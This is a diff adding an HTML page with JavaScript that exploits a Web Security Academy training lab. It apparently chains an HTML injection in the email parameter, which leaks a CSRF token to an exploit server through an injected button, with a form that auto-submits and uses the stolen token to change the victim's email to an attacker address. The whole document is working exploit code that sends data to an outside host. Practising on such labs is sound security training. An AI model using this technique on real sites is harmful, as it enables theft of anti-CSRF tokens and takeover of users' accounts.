@@ -1,0 +1,31 @@
+<body>
+<script>
+const academyFrontend = "https://0ac0004f03e62e2e8070033c00b30068.web-security-academy.net/";
+const exploitServer = "https://exploit-0ab1000503fe2e5c808602d0016400ea.exploit-server.net/exploit";
+
+const url = new URL(location);
+const csrf = url.searchParams.get('csrf');
+
+if (csrf) {
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+
+    token.name = 'csrf';
+    token.value = csrf;
+
+    email.name = 'email';
+    email.value = 'hacker@evil-user.net';
+
+    form.method = 'post';
+    form.action = `${academyFrontend}my-account/change-email`;
+    form.append(email);
+    form.append(token);
+    document.documentElement.append(form);
+    form.submit();
+
+} else {
+    location = `${academyFrontend}my-account?email=rand@om%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
+}
+</script>
+</body>
